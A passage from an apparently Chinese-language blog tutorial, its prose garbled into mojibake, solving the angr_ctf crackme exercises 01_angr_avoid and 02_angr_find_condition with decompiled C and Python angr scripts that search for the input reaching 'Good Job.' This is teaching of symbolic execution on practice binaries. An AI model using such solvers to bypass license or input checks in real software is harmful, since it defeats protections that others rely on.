punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">int32_t</span> <span class="token operator">*</span> v9 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5 <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> <span class="token operator">*</span> v10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0x8048689</span>        <span class="token operator">*</span>v8 <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token operator">*</span>v9 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">*</span>v10<span class="token punctuation">;</span>        <span class="token operator">*</span>v10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token function">complex_function</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">uint32_t</span> v11<span class="token punctuation">;</span> <span class="token comment">// 0x8048602</span>    <span class="token class-name">uint32_t</span> v12<span class="token punctuation">;</span> <span class="token comment">// 0x8048602</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v12 <span class="token operator">&amp;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v11 <span class="token operator">&amp;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 0x808e62f</span>        <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v12 <span class="token operator">&amp;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v11 <span class="token operator">&amp;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v12 <span class="token operator">&amp;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v11 <span class="token operator">&amp;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v12 <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v11 <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// 0x80cb9bf</span>                    <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>v12 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span>v11 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token comment">// 0x80cffb7</span>                        <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v2 <span class="token operator">^</span> v6<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">&amp;</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">&amp;</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">&amp;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                        <span class="token comment">// 0x80d4149</span>                                        <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">&amp;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                            <span class="token comment">// 0x80d4379</span>                                            <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">&amp;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                <span class="token comment">// 0x80d4491</span>                                                <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                    <span class="token comment">// 0x80d4515</span>                                                    <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>v6 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span>v2 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d455c</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d4542</span>                                                        <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span>                                                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>v6 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span>v2 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d4500</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d44e6</span>                                                        <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span>                                                <span class="token punctuation">&#125;</span>                                            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                                 <span class="token comment">// åœ¨æ­¤ä¹‹åä¸€ç›´æ˜¯è¿™æ ·çš„é‡å¤ä»£ç </span>                                                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                    <span class="token comment">// 0x80d442f</span>                                                    <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>v6 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span>v2 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d4479</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d445c</span>                                                        <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span>                                                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>v6 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span>v2 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d4417</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d43fa</span>                                                        <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span>                                                <span class="token punctuation">&#125;</span>                                            <span class="token punctuation">&#125;</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">int32_t</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 0x80d457e</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>v1 <span class="token operator">!=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 0x80d4580</span>        <span class="token function">__stack_chk_fail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        result <span class="token operator">=</span> <span class="token operator">&amp;</span>g2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 0x80d4585</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>å¯ä»¥çœ‹å‡ºç¨‹åºç”±å¤§é‡çš„ifè¯­å¥å †ç Œï¼Œéå¸¸é€‚åˆç”¨ç¬¦å·æ‰§è¡Œçš„æ–¹å¼éå†è·¯å¾„ï¼Œä¸ºäº†å‡å°‘éå†çš„è·¯å¾„æ•°ï¼Œæé«˜æœç´¢æ•ˆç‡ï¼Œæˆ‘ä»¬åº”è¯¥é¿å…è®©ç¨‹åºè¿›å…¥æˆ‘ä»¬ä¸å¸Œæœ›æ‰§è¡Œçš„åˆ†æ”¯ä¸­ï¼Œåœ¨æœ¬é¢˜ä¸­å°±æ˜¯<code>avoid_me()</code>ï¼Œè¿™å°±ç”¨åˆ°äº†<code>explore()</code>çš„å¦ä¸€å‚æ•°<code>avoid</code>ï¼Œå®ƒç”¨äºæŒ‡å®šä¸å¸Œæœ›ç¨‹åºè¿›å…¥çš„è·¯å¾„ã€‚</p><p>ä¸‹é¢ç»™å‡ºé¢˜è§£ï¼Œå¹¶é™„ä¸Šå¿…è¦æ³¨é‡Šï¼ˆå‰é¢å·²ç»è®²è¿‡çš„å†…å®¹ä¼šç®€ç•¥ï¼‰ï¼š</p><blockquote><p>ä¸¤ä¸ªå¿…è¦çš„åœ°å€ä¿¡æ¯åœ¨ä¸Šè¿°çš„æºä»£ç ä¸­å·²å­˜åœ¨</p></blockquote><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">'01_angr_avoid'</span>  <span class="token comment"># åŠ è½½ç¨‹åºä¸ºProjectå¯¹è±¡</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  <span class="token comment">#ã€€è·å–åˆå§‹åŒ–çŠ¶æ€</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># æ¨¡æ‹Ÿæ‰§è¡Œ</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token comment">#ã€€æˆ‘ä»¬æƒ³è¦è¿›å…¥çš„åˆ†æ”¯åœ°å€ï¼Œæ­¤å¤„å¯¹åº”Good Jobçš„è¯­å¥ã€€</span>  print_good_address <span class="token operator">=</span> <span class="token number">0x80485ff</span>  <span class="token comment"># æ£€æŸ¥æºä»£ç ä¸­ Good Jobå¯¹åº”åœ°å€</span>  <span class="token comment"># ä¸å¸Œæœ›æ‰§è¡Œçš„åˆ†æ”¯ï¼Œæ­¤å¤„å¯¹åº”avoid_me()å‡½æ•°çš„åœ°å€</span>  will_not_succeed_address <span class="token operator">=</span> <span class="token number">0x80485a8</span>  <span class="token comment"># æ£€æŸ¥æºä»£ç ä¸­ avoid_me()å¯¹åº”åœ°å€</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">,</span> avoid<span class="token operator">=</span>will_not_succeed_address<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Success, flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210501165557.png" alt=""></p><blockquote><p>ä½ å¯ä»¥å°è¯•å»æ‰avoidå‚æ•°ï¼ŒåŒæ ·èƒ½å¤Ÿè¾¾åˆ°ç›®çš„ï¼Œä½†æ—¶é—´ä¸ŠèŠ±é”€ä¼šæ›´å¤š~</p></blockquote><h2 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h2><p>æœ¬é¢˜ä¸ç¬¬ä¸€é¢˜æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡é¡¾åæ€ä¹‰ï¼Œé€šè¿‡<code>condition</code>çš„æ–¹å¼æ¥é€‰æ‹©<code>find</code>å’Œ<code>avoid</code>çš„åˆ†æ”¯ï¼Œä¹‹å‰æˆ‘ä»¬ä¸€ç›´æ˜¯åç¼–è¯‘ä¹‹åæ‰‹åŠ¨å¡«å†™ç›¸åº”çš„è¯­å¥å†…å­˜åœ°å€ï¼Œå®é™…ä¸Šåœ¨é€‰æ‹©åˆ†æ”¯çš„æ—¶å€™å¯ä»¥æ ¹æ®å¯¹åº”çš„è¾“å‡ºç»“æœæ¥åˆ¤æ–­ï¼Œåœ¨<code>explore</code>çš„æ—¶å€™ä¼ å…¥å‡½æ•°ï¼Œç”¨äºæŒ‡å®šä»€ä¹ˆæƒ…å†µä¸‹é€‰æ‹©è¯¥è·¯å¾„ï¼Œä»€ä¹ˆæ—¶å€™è·³è¿‡è¯¥è·¯å¾„ï¼Œå³å®šä¹‰ï¼š</p><ul><li><code>is_successful(state)</code>: è¿›å…¥åˆ†æ”¯çš„æ¡ä»¶</li><li><code>should_abort(state)</code>: è·³è¿‡åˆ†æ”¯çš„æ¡ä»¶</li></ul><p>æœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'02_angr_find_condition'</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># åœ¨å¯¹è¾“å‡ºè¿›è¡Œåˆ¤æ–­çš„æ—¶å€™æœ‰ä¸¤ç§æ–¹å¼ï¼Œstr compare or bytes compare</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>        <span class="token comment"># return True if b'Good Job.' in stdout_output else False</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span 